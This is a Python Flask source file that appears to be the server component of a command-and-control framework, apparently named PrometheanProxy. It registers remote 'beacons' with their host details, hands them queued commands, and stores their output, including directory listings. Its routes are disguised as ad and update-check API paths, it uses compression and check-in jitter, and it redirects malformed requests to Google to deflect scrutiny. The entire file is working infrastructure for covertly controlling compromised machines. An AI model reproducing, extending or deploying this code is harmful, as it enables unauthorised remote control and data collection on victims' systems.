from flask import Flask, request, jsonify, redirect
import uuid
import os
import time
import zlib
import json

from Modules.global_objects import (
    beacon_list, command_list, config, logger)
from Server.Modules.beacon.beacon import add_beacon_list, remove_beacon_list

# --- Flask App Initialization ---
beaconControl = Flask(__name__)


def _process_request_data(raw_data):
    """
    Decompresses and decodes JSON data from a request.
    Handles both compressed (zlib) and uncompressed data.

    Args:
        raw_data (bytes): The raw data from the request.

    Returns:
        tuple: A tuple containing the parsed data (dict) and an error message (str).
               If successful, the error message is None.
               If it fails, the data is None.
    """
    try:
        # Assumes data is compressed, tries to decompress and decode
        decompressed_data = zlib.decompress(raw_data)
        data = json.loads(decompressed_data.decode('utf-8'))
        logger.debug(f"Successfully decompressed data. Original size: {len(raw_data)} bytes, Decompressed size: {len(decompressed_data)} bytes")
        return data, None
    except zlib.error:
        # If decompression fails, assume it's plain JSON
        logger.debug("Data is not compressed, parsing as plain JSON.")
        try:
            data = json.loads(raw_data.decode('utf-8'))
            return data, None
        except json.JSONDecodeError as e:
            error_msg = f"Failed to parse JSON data: {str(e)}"
            logger.error(error_msg)
            return None, error_msg
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        error_msg = f"Failed to parse decompressed JSON data: {str(e)}"
        logger.error(error_msg)
        return None, error_msg
    except Exception as e:
        error_msg = f"Unexpected error processing request data: {str(e)}"
        logger.error(error_msg)
        return None, error_msg


@beaconControl.route('/<part1>/<part2>/<ad_param>/api/v<int:version>', methods=['POST'])
def connection_request(part1, part2, ad_param, version):
    """Handles the initial connection request from a new beacon."""
    logger.info(f"Connection request from {part1}/{part2}/{ad_param}/api/v{version}")

    if "ad" not in ad_param or version not in range(1, 11):
        logger.error("Invalid parameters in connection request.")
        return '', 404

    data, error = _process_request_data(request.get_data())
    if error:
        return '', 400

    if data and 'name' in data and 'os' in data and 'address' in data:
        userID = str(uuid.uuid4())
        logger.info(f"New connection from {data['name']} on {data['os']} at {data['address']} with UUID {userID}")

        add_beacon_list(
            userID, data['address'], data['name'], data['os'], time.asctime(),
            config['beacon']["interval"], config['beacon']['jitter'], config
        )
        logger.debug(f"Beacon list updated for userID: {userID}")

      
        logger.info(f"Emitted 'new_connection' event via websockets for UUID: {userID}")

        return jsonify({
            "timer": config['beacon']["interval"],
            "uuid": userID,
            "jitter": config['beacon']['jitter']
        }), 200
    else:
        logger.error("Invalid data format in connection request, redirecting to Google.")
        return redirect("https://www.google.com", code=302)


@beaconControl.route('/<part1>/<ad_param>/getLatest', methods=['POST'])
def reconnect(part1, ad_param):
    """Handles a reconnection request if a client lost connection."""
    logger.info(f"Reconnection request from {part1}/{ad_param}/getLatest")

    if "ad" not in ad_param:
        logger.error("Invalid 'ad_param' in reconnection request.")
        return '', 404

    # This route assumes compressed data as per the original logic.
    # _process_request_data could also be used here if uncompressed reconnections are possible.
    try:
        compressed_data = request.get_data()
        decompressed_data = zlib.decompress(compressed_data)
        data = json.loads(decompressed_data.decode('utf-8'))
        logger.debug("Successfully decompressed and parsed reconnection data.")
    except (zlib.error, json.JSONDecodeError, UnicodeDecodeError) as e:
        logger.error(f"Failed to process reconnection data: {e}")
        return '', 400

    required_keys = ["name", "os", "address", "id", "timer", "jitter"]
    if all(key in data for key in required_keys):
        logger.info(f"Reconnection data received for ID: {data['id']}")
        add_beacon_list(
            data['id'], data['address'], data['name'], data['os'], time.asctime(),
            float(data['timer']), float(data['jitter']), config
        )
        logger.info(f"Beacon list updated for reconnection ID: {data['id']}")
        return jsonify({"x": True}), 200
    else:
        logger.error("Invalid data format in reconnection request.")
        return '', 404


@beaconControl.route('/checkUpdates/<part1>/<part2>', methods=['GET'])
def beacon_call_in(part1, part2):
    """Handles periodic beacon check-ins for new commands."""
    logger.info(f"Beacon call-in from {part1}/{part2}")

    beacon_id = request.args.get('session')
    if not beacon_id:
        logger.error("No session ID provided in beacon call-in.")
        return '', 400

    beacon = beacon_list.get(beacon_id)
    if not beacon:
        logger.error(f"Beacon with ID {beacon_id} not found.")
        return '', 404

    # Update beacon timestamps
    beacon.last_beacon = time.asctime()
    next_beacon_time = time.time() + beacon.timer
    beacon.next_beacon = time.asctime(time.localtime(next_beacon_time))
    logger.info(f"Beacon {beacon_id} updated. Next check-in: {beacon.next_beacon}")

    # Check for commands to send
    commands_to_send = []
    for cmd_id, command in command_list.items():
        if command.beacon_uuid == beacon_id and not command.executed:
            logger.debug(f"Queuing command {cmd_id} for beacon {beacon_id}.")
            commands_to_send.append({
                "command_uuid": cmd_id,
                "command": command.command,
                "data": command.command_data
            })
            command.executed = True

    response_data = {"commands": commands_to_send} if commands_to_send else {"none": "none"}
    return jsonify(response_data), 200


@beaconControl.route('/updateReport/<path1>/api/v<int:version>', methods=['POST'])
def response(path1, version):
    """Receives the output from an executed command."""
    logger.info(f"Response received from {path1}/api/v{version}")

    if version not in range(1, 11):
        logger.error("Invalid version in response.")
        return '', 404

    data, error = _process_request_data(request.get_data())
    if error:
        return '', 400

    reports = data.get('reports', [])
    if not reports or 'command_uuid' not in reports[0]:
        logger.error("Invalid report format received.")
        return '', 400

    cid = reports[0]['command_uuid']
    output = reports[0]['output']
    logger.info(f"Received output for command UUID {cid}.")

    command = command_list.get(cid)
    if not command:
        logger.error(f"Command with UUID {cid} not found in command list.")
        return '', 500  # Internal server error, as we expected this command

    command.command_output = output

    # Special handling for directory traversal
    if command.command == "directory_traversal":
        logger.info(f"Directory Traversal response for beacon {command.beacon_uuid}. Saving to file.")

        dir_path = os.path.expanduser(f"~/.PrometheanProxy/{command.beacon_uuid}")
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)

        with open(os.path.join(dir_path, "directory_traversal.json"), "w") as f:
            f.write(output)
    
    if command.command == "session":
        logger.info(f"Session command response for beacon {command.beacon_uuid}. Updating beacon list.")
        logger.debug(f"Removing beacon {command.beacon_uuid} from the list.")
        remove_beacon_list(command.beacon_uuid)

  

    return '', 200
